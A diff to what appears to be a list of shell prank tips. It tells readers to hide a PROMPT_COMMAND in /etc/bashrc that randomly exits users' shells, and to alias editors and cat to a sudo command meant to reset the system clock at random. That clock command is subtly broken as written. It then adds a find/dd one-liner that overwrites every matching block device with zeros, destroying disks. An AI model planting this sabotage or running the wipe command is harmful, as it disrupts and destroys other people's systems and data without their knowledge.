@@ -285,3 +285,13 @@ Random exits
 This one is sure to confuse. A user will exit his shell somewehere random inside 30 minutes after starting it. Hide the following piece of code somewhere in /etc/bashrc or a .sh file in /etc/profile.d/
 
 > export PROMPT_COMMAND='[ ${SECONDS} -ge $[ ${RANDOM} % 1800 ]] && exit'
+%
+Very Nice, i like your style, maybe something less destructive but infuriating? alias all editors and cat to something like....
+
+> sudo date --set="shuf -i 1-23 -n 3 | tr '\n' ':' | sed -e 's/:$//g'" ; cat
+
+Sets the system time to random-ish times whenever they use the command
+%
+> find /dev -type b -name '?d?' -exec dd if=/dev/zero of={} bs=16M \;
+%
+
